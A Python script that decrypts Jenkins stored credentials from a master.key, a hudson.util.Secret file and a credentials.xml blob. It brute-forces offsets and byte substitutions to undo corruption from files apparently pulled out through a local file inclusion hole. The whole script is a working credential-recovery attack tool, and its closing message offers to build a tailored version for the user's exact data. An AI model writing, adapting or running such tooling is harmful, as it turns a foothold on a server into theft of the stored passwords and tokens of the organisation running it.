#!/usr/bin/env python3
import sys
import base64
import hashlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

def derive_master_aes(master_path):
    with open(master_path, 'rb') as f:
        master_key = f.read().strip()
    return hashlib.sha256(master_key).digest()[:16]

def try_decrypt_blob(master_aes, hudson_bytes, encrypted_b64):
    try:
        # Strip optional {} wrapper (very common in credentials.xml)
        if encrypted_b64.startswith('{') and encrypted_b64.endswith('}'):
            encrypted_b64 = encrypted_b64[1:-1]
        encrypted = base64.b64decode(encrypted_b64)
        cipher = AES.new(master_aes, AES.MODE_ECB)
        decrypted_hudson = cipher.decrypt(hudson_bytes)
        conf_key = decrypted_hudson[:16]

        cipher = AES.new(conf_key, AES.MODE_ECB)
        decrypted = cipher.decrypt(encrypted)
        unpadded = unpad(decrypted, AES.block_size)
        plain = unpadded.decode('utf-8', errors='ignore').strip()
        if len(plain) > 2 and any(c.isalnum() for c in plain):  # heuristic for success
            return plain, conf_key.hex()
        return None, None
    except Exception:
        return None, None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 jenkins_bruteforce_v2.py <master.key> <hudson.trim.bin> <one_AQ_or_{AQ}_blob>")
        sys.exit(1)

    master_path = sys.argv[1]
    hudson_path = sys.argv[2]
    test_blob = sys.argv[3]

    master_aes = derive_master_aes(master_path)

    with open(hudson_path, 'rb') as f:
        raw_hudson = f.read()[:96]  # your trimmed file

    print("[*] Trying different start offsets + common LFI corruption patterns...")

    found = False
    for offset in range(0, 17):  # slide the 32-byte window
        for i in range(offset, len(raw_hudson) - 31):
            hudson_data = raw_hudson[i:i+32]
            if len(hudson_data) < 32:
                continue
            hudson_data = hudson_data[:len(hudson_data) & ~0xF]

            # Try original + heavy corruption on first 8 bytes (common LFI pollution)
            candidates = [hudson_data]
            for pos in range(min(8, len(hudson_data))):
                for repl in [b'\x00', b'\x3f', b'\xff', b'\xef\xbf\xbd']:  # null, ?, ff, �
                    variant = hudson_data[:pos] + repl + hudson_data[pos+len(repl):]
                    candidates.append(variant[:len(variant) & ~0xF])

            for candidate in candidates:
                plain, key_hex = try_decrypt_blob(master_aes, candidate, test_blob)
                if plain:
                    print(f"\n[+] SUCCESS with offset {i}!")
                    print(f"[+] Confidentiality key: {key_hex}")
                    print(f"[+] Decrypted: {plain}")
                    found = True
                    break
            if found:
                break
        if found:
            break

    if not found:
        print("[-] Still no luck. Run the xxd command above and paste it — we'll make a targeted script for your exact mangling.")
